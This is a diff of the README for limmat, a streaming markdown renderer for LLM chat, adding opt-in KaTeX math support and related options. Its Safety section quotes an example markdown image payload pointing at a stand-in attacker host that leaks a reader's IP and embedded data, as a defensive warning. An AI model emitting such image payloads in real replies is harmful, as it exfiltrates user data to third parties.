@@ -17,7 +17,7 @@ Streaming markdown for LLM chat. Half-typed syntax like `[docs](https://example`
 - **Predictable.** However the text is cut into chunks, the page ends up the same as rendering it all at once.
 - **Safe.** It builds DOM nodes, never HTML strings, so hostile text stays text. Remote images load by default, so limit them with `images` (see [Safety](#safety)).
 - **Any framework.** Ready-made components for React, Vue, Svelte, and Solid. Angular and plain JavaScript take any DOM element.
-- **Small and fast.** 11.7 kB gzip and no dependencies ([how it compares](#how-it-compares)). A 100 KB reply streamed in small chunks takes about 20 ms in total in Chromium.
+- **Small and fast.** 13.4 kB gzip and no dependencies ([how it compares](#how-it-compares)). A 100 KB reply streamed in small chunks takes about 20 ms in total in Chromium.
 
 ## Install and usage
 
@@ -46,6 +46,15 @@ For colored code, add the optional highlighter (it needs `@speed-highlight/core`
 ```ts
 import { speedHighlight } from 'limmat/highlight';
 createRenderer(el, { highlight: speedHighlight() });
+```
+
+For math, add the optional KaTeX adapter (it needs `katex` and its stylesheet). Without it, math stays plain text:
+
+```ts
+import katex from 'katex';
+import { katexMath } from 'limmat/katex';
+import 'katex/dist/katex.min.css';
+createRenderer(el, { renderMath: katexMath(katex) }); // $x^2$, \(x\), \[x\], $$x$$
 ```
 
 ### React, Vue, Svelte, and Solid
@@ -166,12 +175,13 @@ limmat follows [CommonMark](https://spec.commonmark.org/0.31.2/) and GFM for the
 | Task lists | ✅&nbsp;Supported | Checkboxes are read-only. |
 | Bold, italic, strikethrough | ✅&nbsp;Supported | `snake_case_words` stay text. Strikethrough needs two tildes. |
 | Collapsible sections (`<details>`) | ✅&nbsp;Supported | Each tag alone on its line. |
+| Math (`$x$`, `\(x\)`, `$$x$$`) | ✅&nbsp;Supported | Opt-in through `renderMath` (`limmat/katex` provides one). Not in `limmat/server`. |
 | Lists | ⚠️&nbsp;Partial | Nesting works. Blank lines between items are ignored. |
 | Links and bare URLs | ⚠️&nbsp;Partial | Only http, https, and mailto. Titles are dropped. Unsafe URLs show as text. |
 | Images | ⚠️&nbsp;Partial | On by default and loaded without a click, so limit them with `images`. No titles. |
 | Raw HTML | ⚠️&nbsp;Partial | Shown as text, except a few tags like `<kbd>` and `<sub>`. |
 | Reference links | ❌&nbsp;Not&nbsp;yet |  |
-| Math, footnotes, citations, emoji codes | ❌&nbsp;Not&nbsp;yet | Math, footnotes, and citations are planned as opt-ins. |
+| Footnotes, citations, emoji codes | ❌&nbsp;Not&nbsp;yet | Footnotes and citations are planned as opt-ins. |
 <!-- support:end -->
 
 ## Options
@@ -184,6 +194,8 @@ Pass options as the second argument to `createRenderer`. All are optional, and t
 | `images` | `true` | Allowed image origins, like `['https://cdn.example.com']`, or `false` to show "Image not shown: alt text" instead. See [Safety](#safety). |
 | `html` | `true` | Which safe tags become elements, like `<kbd>` and `<details>`: `true` for all, a list to keep only some, or `false` to show them as text (except `<br>`). |
 | `highlight` | none | `(el, code, lang) => void`, called for each finished code block. `limmat/highlight` provides one. It can also draw diagrams ([mermaid recipe](https://github.com/DaanRosendal/limmat/blob/master/docs/mermaid.md)). |
+| `renderMath` | none | `(el, tex, { display }) => void`, called once for each finished formula: `\(x\)`, `\[x\]`, `$$x$$`, and `$x$`. Fill `el` with your math library's output. It may return a promise. `limmat/katex` provides one. Without it, math stays text. |
+| `singleDollarMath` | `true` | With `renderMath` set, `$x^2$` is math, and prices like `$5 and $10` stay text. `false` keeps math to `\(x\)`, `\[x\]`, and `$$x$$`. |
 | `onLinkClick` | none | `(href, event) => boolean`. Return `true` to handle the click yourself. |
 | `isInternalPath` | all paths | `(path) => boolean`. Decides which site paths like `/docs/x` become links. Check the whole path. |
 | `allowedProtocols` | `https`, `http`, `mailto`, and 4 more | Protocols that become links. The default also includes `tel`, `irc`, `ircs`, and `xmpp`. Others show as text. A protocol you list is trusted, except `javascript`, `data`, and `vbscript`, which are always refused. |
@@ -213,6 +225,7 @@ createRenderer(el, {
 - Links: only an allowed protocol (`allowedProtocols`) or a site path (`isInternalPath`) becomes a link (see [Options](#options)).
 - Images: they load without a click, so a hostile reply can embed `![](https://evil.example/?x=...)`. The request reveals the reader's IP address and carries whatever the reply put in the URL. Pass `images: ['https://your-cdn.example']` or `images: false` to limit that.
 - Highlighter: the optional highlighter passes code to `@speed-highlight/core`, which builds HTML itself.
+- Math: the optional `renderMath` runs your math library, and limmat does not check what it builds. Keep KaTeX's `trust` off (`limmat/katex` does), and see [SECURITY.md](https://github.com/DaanRosendal/limmat/blob/master/SECURITY.md).
 
 More in [SECURITY.md](https://github.com/DaanRosendal/limmat/blob/master/SECURITY.md).
 
